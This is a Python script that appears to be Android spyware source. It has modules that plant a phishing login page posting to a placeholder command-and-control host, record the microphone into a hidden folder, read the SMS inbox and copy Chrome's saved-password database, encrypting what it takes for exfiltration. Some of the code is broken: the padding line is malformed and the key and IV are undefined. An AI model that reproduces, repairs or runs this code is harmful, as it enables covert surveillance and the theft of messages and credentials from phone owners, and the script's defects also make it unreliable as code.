import os, requests, subprocess  
from Crypto.Cipher import AES  
import base64, sqlite3, shutil  

# AES Encryption  
def encrypt(data):  
    cipher = AES.new(key, AES.MODE_CBC, iv)  
    pad = lambda s: s + (16 - len(s) % 16 * chr(16 - len(s) % 16)  
    return base64.b64encode(cipher.encrypt(pad(data)))  

# 1. PHISHING MODULE  
def inject_phishing_page():  
    with open('/sdcard/Download/login.html', 'w') as f:  
        f.write("""<html><body><form action='http://your-c2.com/phish' method='post'>""")  

# 2. MIC RECORDING  
def record_mic(duration=10):  
    os.system(f"termux-microphone-record -f /sdcard/.cache/audio.mp3 -l {duration}")  
    return "/sdcard/.cache/audio.mp3"  

# 3. SMS FORWARDING  
def forward_sms():  
    sms = subprocess.getoutput("content query --uri content://sms/inbox")  
    return encrypt(sms)  

# 4. BROWSER CREDENTIAL SNATCHER  
def steal_chrome_passwords():  
    try:  
        shutil.copy2('/data/data/com.android.chrome/app_chrome/Default/Login Data', '/sdcard/.cache/chrome_passwords.db')  
        conn = sqlite3.connect('/sdcard/.cache/chrome_passwords.db')  
        cursor = conn.cursor()  
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")  
        return encrypt(str(cursor.fetchall()))  
    except Exception as e:  
        return encrypt(f"Error: {str(e)}")  
